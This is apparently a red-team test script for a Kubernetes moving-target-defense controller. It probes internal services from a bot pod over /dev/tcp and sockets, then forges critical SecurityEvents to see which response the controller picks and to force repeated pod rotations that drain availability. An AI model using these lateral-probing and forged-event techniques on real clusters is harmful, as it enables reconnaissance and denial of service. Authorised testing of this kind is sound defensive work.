#!/usr/bin/env bash
# batch3e.sh — T41 (Q1: injection-driven lateral probing -> what does Phorvex pick?)
# and T44 (R3·V22: rotation-as-drain, bounded — 2 forged events spaced past the
# antiOverRotationWindow). Runs LAST in the sweep: it rotates the voice bot (2 replicas,
# absorbed — same as T4/T8/T13). voice-defense stays AS-FOUND ([rotate], reactiveOnly:true).
set -uo pipefail
NSX=phorvex-system; NSV=voice
OUT=/tmp/px-batch3e; mkdir -p "$OUT"
say(){ printf '\n=== %s ===\n' "$*"; }
OP=$(kubectl get pods -n $NSX -l app.kubernetes.io/name=phorvex -o jsonpath='{.items[0].metadata.name}')
date -Is | tee "$OUT/start.txt"

# background availability sampler (2s cadence) for the whole run
( while true; do
    R=$(kubectl get deploy -n $NSV voice-bot -o jsonpath='{.status.readyReplicas}/{.spec.replicas}' 2>/dev/null)
    echo "$(date -u +%H:%M:%SZ) $R"; sleep 2
  done > "$OUT/availability.txt" ) &
SAMP=$!; trap 'kill $SAMP 2>/dev/null' EXIT

WINDOW=$(kubectl get phorvexpolicy -n $NSV voice-defense -o jsonpath='{.spec.budget.antiOverRotationWindow}')
echo "antiOverRotationWindow: $WINDOW" | tee "$OUT/window.txt"

say "1) T41: lateral probing from the bot pod (fresh GP6-style evidence)"
BOT=$(kubectl get pods -n $NSV -l app=voice-bot --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')
echo "attacker pod: $BOT" | tee "$OUT/t41-lateral.txt"
kubectl exec -n $NSV $BOT -- sh -c '
  for t in "chroma.document-store.svc.cluster.local:8000" "litellm.litellm.svc.cluster.local:4000" "mongo.document-store.svc.cluster.local:27017" "mcp-server.mcp.svc.cluster.local:8000"; do
    (echo > /dev/tcp/${t%:*}/${t#*:}) 2>/dev/null && echo "REACHABLE  $t" || echo "refused    $t"
  done' 2>/dev/null | tee -a "$OUT/t41-lateral.txt" || \
  kubectl exec -n $NSV $BOT -- python3 -c "
import socket
for h,p in [('chroma.document-store.svc.cluster.local',8000),('litellm.litellm.svc.cluster.local',4000),('mongo.document-store.svc.cluster.local',27017),('mcp-server.mcp.svc.cluster.local',8000)]:
    s=socket.socket(); s.settimeout(3)
    try: s.connect((h,p)); print('REACHABLE  %s:%d'%(h,p))
    except Exception as e: print('refused    %s:%d (%s)'%(h,p,type(e).__name__))
    finally: s.close()" | tee -a "$OUT/t41-lateral.txt"

say "2) T41: fire LateralMovement critical at the bot pod — what does the brain pick?"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ); echo "event at $T0 target voice/$BOT" | tee "$OUT/t41-event.txt"
kubectl apply -f - <<EOF
apiVersion: amtd.r6security.com/v1beta1
kind: SecurityEvent
metadata: {name: redteam-q1-$(date +%s)}
spec:
  rule: {type: LateralMovement, threatLevel: critical, source: redteam}
  targets: ["$NSV/$BOT"]
  description: "Q1: agent-driven internal probing detected from this pod"
  anomalyScore: "0.95"
EOF
ACT=""
for i in $(seq 1 24); do
  sleep 5
  L=$(kubectl logs -n $NSX $OP --since=3m 2>/dev/null | grep "$NSV/$BOT" | grep "decision" | tail -1)
  if [ -n "$L" ]; then ACT="$L"; break; fi
done
echo "${ACT:-NO DECISION in 120s}" | tee "$OUT/t41-decision.txt"
for i in $(seq 1 24); do sleep 5; kubectl get pod -n $NSV $BOT >/dev/null 2>&1 || break; done
kubectl get pod -n $NSV $BOT >/dev/null 2>&1 && echo "pod NOT rotated" | tee -a "$OUT/t41-decision.txt" || echo "pod ROTATED" | tee -a "$OUT/t41-decision.txt"
kubectl wait -n $NSV --for=condition=Ready pod -l app=voice-bot --timeout=180s 2>/dev/null
kubectl get pods -n $NSV --no-headers | tee "$OUT/t41-pods-after.txt"

say "3) T44 (R3·V22): bounded rotation-drain — 2 forged events spaced past the window"
echo "waiting 125s for the anti-over-rotation window to clear on the replacement pod..." | tee "$OUT/t44.txt"
sleep 125
ROTS=0
for n in 1 2; do
  BOTN=$(kubectl get pods -n $NSV -l app=voice-bot --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')
  TN=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  echo "forged event #$n at $TN target voice/$BOTN" | tee -a "$OUT/t44.txt"
  kubectl apply -f - <<EOF
apiVersion: amtd.r6security.com/v1beta1
kind: SecurityEvent
metadata: {name: redteam-r3-$n-$(date +%s)}
spec:
  rule: {type: Panic, threatLevel: critical, source: redteam}
  targets: ["$NSV/$BOTN"]
  description: "R3: forged detector event (churn attempt $n)"
  anomalyScore: "0.99"
EOF
  for i in $(seq 1 24); do sleep 5; kubectl get pod -n $NSV $BOTN >/dev/null 2>&1 || { ROTS=$((ROTS+1)); echo "  -> pod ROTATED (rotation $ROTS)" | tee -a "$OUT/t44.txt"; break; }; done
  kubectl wait -n $NSV --for=condition=Ready pod -l app=voice-bot --timeout=180s 2>/dev/null
  [ $n -eq 1 ] && { echo "  spacing 125s (window)..." | tee -a "$OUT/t44.txt"; sleep 125; }
done
echo "total attacker-forced rotations this run window: $ROTS (+1 from T41)" | tee -a "$OUT/t44.txt"

say "4) availability trace around the churn"
sort "$OUT/availability.txt" | uniq -c | sort -rn | head -5 | tee "$OUT/t44-avail-summary.txt"
echo "(2/2 held = second replica absorbed it; on a 1-replica service each rotation is an outage — the R3 amplification point)" | tee -a "$OUT/t44-avail-summary.txt"

say "5) cleanup: events deleted; policy untouched (as-found throughout)"
for e in $(kubectl get securityevent -o jsonpath='{.items[?(@.spec.rule.source=="redteam")].metadata.name}' 2>/dev/null); do kubectl delete securityevent $e --wait=false 2>/dev/null; done
kubectl get pods -n $NSV --no-headers | tee "$OUT/pods-final.txt"
date -Is | tee "$OUT/end.txt"
